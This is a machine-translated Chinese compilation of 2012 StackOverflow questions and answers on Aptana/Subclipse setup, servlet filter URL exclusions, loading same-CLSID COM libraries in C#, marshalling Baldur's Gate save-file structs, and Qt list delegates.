# StackOverflow 问答 11820000-11820999

# ruby-on-rails - 使用 Aptana 安装源代码控制

> ID：11820000
> 
> 赞同：1
> 
> 时间：2012-08-05T20:54:11.663
> 
> 标签：ruby-on-rails, svn, tortoisesvn, aptana

我正在使用 Aptana Studio 3，构建：3.2.1.201207261642，我想将我的代码添加到任何类型的源代码控制以实现可管理性。它只是一个宠物项目，我正在做这个项目来学习 ruby​​ on rails。

通过 aptana IDE 安装 SVN 时，出现以下错误。

我缺少先决条件吗？

![在此处输入图像描述](../Images/375f4bb5ebbe32a661b1f5669966e9eb.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T19:33:33.663

要让 Subclipse 在没有先决条件的情况下工作，请取消选中：

*   Mylyn 3.x 的 Subclipse 集成（可选）
*   颠覆修订图

它们不是强制性的。

如果您真的想使用 Subclipse Revision Graph，请将 GEF 添加到您的更新站点并安装 Draw2D：[Eclipse 更新站点](http://download.eclipse.org/tools/gef/updates/releases/)

如果您真的想为 Mylyn 3.x 使用 Subclipse 集成，请安装 Eclipse Marketplace。[这个](http://marketplace.eclipse.org/quickstart)网站会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:38:20.543

看起来您的问题是您想使用*Subversion Revision Graph*并且您缺少依赖项，而 Aptana 找不到它。有两种解决方案：

*   取消选中*Subversion Revision Graph*。如果需要，可以使用 TortoiseSVN。
*   [安装缺少的依赖项](http://www.eclipse.org/gef/draw2d/index.php)。它位于错误消息的底部：org.eclipse.draw2d（3.2.0 版）。可能是它没有安装，或者您安装了旧版本。您可能想要更新所有已安装的软件，看看是否可以安装它。

[Cigano Morrison Mendez](https://stackoverflow.com/a/13276850/368630)提到*Mylyn 3.x 的 Subclipse 集成（可选）*也缺少先决条件，但我没有看到。然而，Mylyn 是 Eclipse 的一个问题跟踪系统，并集成到 MantisBT、Rally 和 Jira 之类的东西中。如果您没有问题跟踪系统，那么您真的不需要 Mylyn。继续并取消选中它。

# python - 你如何解析使用 pysvn 创建的差异文件？

> ID：11820004
> 
> 赞同：2
> 
> 时间：2012-08-05T20:54:40.337
> 
> 标签：python, svn, diff, pysvn


[谷歌闭包编译器](https://developers.google.com/closure/compiler/)

CC 比 yui-compressor 或 jsmin 等其他工具更雄心勃勃（也更有价值）

# java - 如何不为特定的 url 模式运行 servlet 过滤器？

> ID：11820207
> 
> 赞同：0
> 
> 时间：2012-08-05T21:26:08.437
> 
> 标签：java, tomcat, servlets, servlet-filters, web.xml

我想创建一个 servlet 过滤器，它适用于我的所有 URL 路径，除了一些指定（或理想情况下由正则表达式指定）。

那可能吗？不幸的是，我无法更改路径，以使我所有其他 URL 都以常见的开头....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:09:38.873

您不能通过符合规范的配置来做到这一点。你有几个选择：

1.  重新编写您`<filter-mapping>`的 s 以使它们更加具体（例如，`/foo`变为但不是）。`/foo/bar``/foo/baz``/foo/foo`
2.  更改过滤器中的代码，使其了解“排除”URI 模式的列表。`<init-param>`如果您想在 中配置它们，您甚至可以使用它们`web.xml`，但您必须自己完成真正的工作。
3.  添加一组共享公共 URI 前缀的`<filter-mapping>`s 和`<servlet-mapping>`s*并开始使用**它们*（保留旧映射有效）。

# c# - 是否可以在 C# 中同时加载具有相同 GUID/CLSID 的两个不同的 ole com 库

> ID：11820209
> 
> 赞同：0
> 
> 时间：2012-08-05T21:26:50.720
> 
> 标签：c#, dll, com, ole

我有三个供应商提供的 ole com 库，它们为不同但相似的设备提供接口。这些库在设备之间不兼容，并且嵌入了不同的功能。它们也都共享相同的 ID，所以我一次只能在一台机器上注册一个。不幸的是，我没有源代码，也无法重新编译它们。

我的问题是，我经常需要能够与不止一种型号的设备进行通信。

我尝试从特定路径加载 dll 并将其转换为程序集，创建它的实例并为我需要的函数提取方法信息。这似乎有效。正如预期的那样，不同库的类型信息是不同的，但是每当我实例化它时，它似乎仍然只加载注册的 dll，因为如果我调用不在当前注册的 dll 中的函数，它会崩溃并因访问冲突而烧毁。有没有人有任何想法？

```
[DllImport("oleaut32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
public static extern void LoadTypeLibEx(String strTypeLibName, RegKind regKind, [MarshalAs(UnmanagedType.Interface)] out Object typeLib);

public enum RegKind
{
  RegKind_Default = 0,
  RegKind_Register = 1,
  RegKind_None = 2
}

private void Initialize() {

  Type ct;
  object typeLib;

  try {
    // Load DLL
    LoadTypeLibEx(@"c:\temp\zkA11C\zkemkeeper.dll", RegKind.RegKind_None, out typeLib);

    if (typeLib == null)
      throw new Exception("LoadTypeLibEx returned null pointer");

    TypeLibConverter converter = new TypeLibConverter();
    ConversionEventHandler eventHandler = new ConversionEventHandler();
    AssemblyBuilder zkA11C = converter.ConvertTypeLibToAssembly(typeLib, "zkA11C.dll", 0, eventHandler, null, null, null, null);

    // Get class type
    ct = zkA11C.GetType("zkA11C.CZKEMClass");

    // Create instance of the class
    dllClassInstance = Activator.CreateInstance(ct);

    // Get method info for functions
    fmiConnect = ct.GetMethod("Connect_Net");
    ...
  }
  catch (Exception e) {
    throw new Exception("Failed to load library: " + e.Message);
  }
} 
```

# c# - 读取具有正确编码的固定字符数组

> ID：11820211
> 
> 赞同：3
> 
> 时间：2012-08-05T21:26:56.260
> 
> 标签：c#, encoding, struct, unsafe

我正在尝试为无限引擎创建的游戏（Baldur's gate、planescape Torment 等）开发一个改装工具。我知道 Infinity Engine 文件中有哪些类型的数据结构，我正在从 byte[] 内容映射一些对象。然而，它缺乏一些性能，我对此并不满意。

我在托管世界上的映射对象是结构，我知道它们代表了多少字节。因此我决定在不安全的代码中进行映射过程。我对 Uint、ushort 之类的值类型值没有任何问题，但是在字符串类型中我遇到了 char[] 编码问题。

例如，您可以在 c# 中看到 struct gam 文件的 Header，

[http://iesdp.gibberlings3.net/file_formats/ie_formats/gam_v2.0.htm](http://iesdp.gibberlings3.net/file_formats/ie_formats/gam_v2.0.htm)

```
[StructLayout(LayoutKind.Explicit, Size = 180,CharSet = CharSet.Ansi)]
public unsafe struct Header
{
    [FieldOffset(0)] 
    public fixed char Signature[4];

    [FieldOffset(0x0004)]
    public fixed char Version[4];

    [FieldOffset(0x0008)] public uint GameTime;

    [FieldOffset(0x000c)] public ushort SelectedFormation;

    [FieldOffset(0x000e)] public ushort FormationButton1;

    [FieldOffset(0x0010)] public ushort FormationButton2;

    [FieldOffset(0x0012)] public ushort FormationButton3;

    [FieldOffset(0x0014)] public ushort FormationButton4;

    [FieldOffset(0x0016)] public ushort FormationButton5;

    [FieldOffset(0x0018)] public uint PartyGold;

    [FieldOffset(0x001c)] public ushort NpcStructCountForPartyEx;

    [FieldOffset(0x001e)] public ushort WeatherBitfield;

    [FieldOffset(0x0020)] public uint NpcStructOffsetForParty;

    [FieldOffset(0x0024)] public uint NpcStructCountForPartyInc;

    [FieldOffset(0x0028)] public uint Unknown1;

    [FieldOffset(0x002c)] public uint Unknown2;

    [FieldOffset(0x0030)] public uint NpcStructOffsetForNonParty;

    [FieldOffset(0x0034)] public uint NpcStructCountForNonParty;

    [FieldOffset(0x0038)] public uint GlobalNamespaceVarOffset;

    [FieldOffset(0x003c)] public uint GlobalNamespaceVarCount;

    [FieldOffset(0x0040)] public fixed char MainArea[8];

    [FieldOffset(0x0048)] public uint FamilarExtraOffset;

    [FieldOffset(0x004c)] public uint JournalEntriesCount;

    [FieldOffset(0x0050)] public uint JournalEntriesOffset;

    [FieldOffset(0x0054)] public uint PartyReputation;

    [FieldOffset(0x0058)] public fixed char CurrentArea [8];

    [FieldOffset(0x0060)] public uint GuiFlags;

    [FieldOffset(0x0064)] public uint LoadingProgress;

    [FieldOffset(0x0068)] public uint FamilarInfoOffset;

    [FieldOffset(0x006c)] public uint StoredLocOffset;

    [FieldOffset(0x0070)] public uint StoredLocCount;

    [FieldOffset(0x0074)] public uint GameTimeSec;

    [FieldOffset(0x0078)] public uint PocketPlaneOffset;

    [FieldOffset(0x007c)] public uint PocketPlaneCount;

    [FieldOffset(0x0080)] public fixed byte Unknown3 [52];
} 
```

这就是映射 this 对象的方式；

```
 string path = @"C:\Baldur.gam";

        byte[] content = IoHelper.ReadBinaryFile(path);

        unsafe
        {
            fixed (byte* pointContent = content)
            {
                Header* header = (Header*) pointContent; 
            }
        } 
```

这是我拥有的 char 签名的结果；

[0] = 21057 '剁' [1] = 13624 '㔸'

这些字符真的不合理。我猜这是由编码引起的。有谁知道这个的解决方案？或者我是否必须自己读取带有 Encoding.ASCII.GetString 的字符数组？如果我用这种方法读取一个特定大小的字节 []，我会得到真正的结果。

这些结构也有不同的版本。作为上面示例中的示例，有一个 V.2.0 版本的 Baldur's Gate 2 Gam 文件。然而，在 Baldur's Gate 1 中，版本更改为 v.1.0，这不适用于我的方法。我想阅读这些不同的方法并将它们映射到模型中，然后将它们发送回 UI 层。你对阅读不同类型的版本有什么建议吗？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T18:42:50.637

我解决了我的问题。

我问过的人说；

*“在 .net 中，字符长 2 个字节。如果直接投射，则无法执行此操作。为此，您可以使用 Marshall 类 PtrToStructureMethod”*

我将固定字节成员替换为字符串并使用 MarshalAs 属性，例如；

```
 [FieldOffset(0x0004), MarshalAs(UnmanagedType.ByValTStr, SizeConst = 4)]
    public string Version; 
```

并将我的映射代码替换为；

```
 string path = @"G:\Games\BGOrg\BGII - SoA\save\000000001-Quick-Save\Baldur.gam";

        byte[] content = IoHelper.ReadBinaryFile(path);

        IntPtr unmanagedPointer = Marshal.AllocHGlobal(content.Length);
        Marshal.Copy(content, 0, unmanagedPointer, content.Length);

        Header header = (Header) Marshal.PtrToStructure(unmanagedPointer, typeof (Header)); 
```

奇迹般有效 ：）

问候。

# qt - 如何从 QAbstractItemDelegate 访问 QListWidget 或 QListWidgetItem

> ID：11820212
> 
> 赞同：1
> 
> 时间：2012-08-05T21:27:00.127
> 
> 标签：qt, list, delegates, paint, qlistwidget

这在Qt中甚至可能吗？我有一个带有特定绘画委托的 QListWidget 设置，并且我试图根据 QListWidget 父级中的变量来不同地绘制委托。我想只要我有一个指向任何一个的指针，我就可以装配一些东西，但我需要在代表的paint() 中以某种方式得到它们。

我已经尝试过“hack”将指针存储在 QVariant 中，但它似乎不起作用，我宁愿不采用这种方法。如果我可以得到指向委托所代表的项目的指针，并且只需调用 item->listWidget()，这将是完美的，但在委托内部似乎不可能。

有什么解决方法可以做到这一点吗？

